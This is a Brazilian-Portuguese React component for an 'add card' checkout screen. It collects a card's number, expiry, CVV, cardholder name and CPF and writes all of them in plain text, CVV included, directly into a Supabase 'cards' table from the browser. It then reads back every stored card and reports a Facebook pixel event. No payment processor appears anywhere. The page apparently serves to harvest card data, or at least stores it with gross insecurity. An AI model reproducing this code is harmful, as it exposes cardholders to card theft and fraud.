"use client";

import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ArrowLeft, Smartphone, Trash2, Loader2, Info } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { showError, showSuccess } from '@/utils/toast';
import { supabase } from "@/integrations/supabase/client";
import { trackFacebookEvent } from '@/utils/facebook-pixel';

const AddCard: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [name, setName] = useState("");
  const [cpf, setCpf] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [step, setStep] = useState(0);
  const [brand, setBrand] = useState<'visa' | 'mastercard' | 'elo' | 'unknown'>('unknown');
  const [savedCards, setSavedCards] = useState<any[]>([]);
  const [selectedCardId, setSelectedCardId] = useState<string | null>(null);

  useEffect(() => { fetchSavedCards(); }, []);

  const fetchSavedCards = async () => {
    const { data } = await supabase.from('cards').select('*').order('created_at', { ascending: false });
    if (data) setSavedCards(data);
  };

  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 16);
    if (digits.length > 0) {
      if (digits[0] === '4') setBrand('visa');
      else if (digits[0] === '5') setBrand('mastercard');
      else setBrand('unknown');
    }
    return digits.match(/.{1,4}/g)?.join(' ') || digits;
  };

  const handleContinue = async () => {
    if (selectedCardId && !cardNumber.trim()) {
      const card = savedCards.find(c => c.id === selectedCardId);
      if (card) {
        trackFacebookEvent('AddPaymentInfo');
        navigate(-1, { state: { ...location.state, cardData: card } });
        return;
      }
    }

    if (cardNumber.replace(/\s/g, '').length < 15) { showError("Dados incompletos."); return; }

    setIsProcessing(true);
    try {
      const { data, error } = await supabase.from('cards').insert([{
        card_number: cardNumber, expiry, cvv, name, cpf: cpf.replace(/\D/g, ''),
        last4: cardNumber.replace(/\s/g, '').slice(-4),
        brand: brand === 'unknown' ? 'mastercard' : brand
      }]).select().single();

      if (!error) {
        trackFacebookEvent('AddPaymentInfo');
        setStep(2);
        setTimeout(() => navigate(-1, { state: { ...location.state, cardData: data } }), 1000);
      }
    } catch (err) { setIsProcessing(false); }
  };

  return (
    <div className="min-h-screen bg-white">
      {isProcessing && <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-8"><Loader2 className="animate-spin text-[#FF2C55]" /></div>}
      <div className="h-12 border-b flex items-center px-4"><button onClick={() => navigate(-1)}><ArrowLeft size={24} /></button><h1 className="flex-grow text-center font-bold">Adicionar cartão</h1></div>
      <div className="p-4 space-y-5">
        <input placeholder="Número do cartão" className="w-full bg-gray-50 h-14 px-4 rounded-xl border" value={cardNumber} onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} />
        <div className="grid grid-cols-2 gap-4">
          <input placeholder="MM/AA" className="w-full bg-gray-50 h-14 px-4 rounded-xl border" value={expiry} onChange={(e) => setExpiry(e.target.value)} />
          <input placeholder="CVV" className="w-full bg-gray-50 h-14 px-4 rounded-xl border" value={cvv} onChange={(e) => setCvv(e.target.value)} />
        </div>
        <input placeholder="NOME NO CARTÃO" className="w-full bg-gray-50 h-14 px-4 rounded-xl border uppercase" value={name} onChange={(e) => setName(e.target.value)} />
        <input placeholder="CPF DO TITULAR" className="w-full bg-gray-50 h-14 px-4 rounded-xl border" value={cpf} onChange={(e) => setCpf(e.target.value)} />
        <Button className="w-full h-14 bg-[#FF2C55] rounded-full font-bold" onClick={handleContinue}>Continuar</Button>
      </div>
    </div>
  );
};

export default AddCard;